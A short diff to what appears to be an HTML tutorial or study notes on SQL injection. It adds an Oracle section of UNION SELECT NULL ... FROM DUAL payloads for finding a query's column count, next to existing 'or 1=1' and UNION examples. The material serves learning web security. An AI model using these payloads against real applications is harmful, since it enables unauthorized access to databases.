@@ -69,3 +69,8 @@ WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 ...</pre>
+  <p><strong>Oracle</strong></p>
+<pre>' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+...</pre>
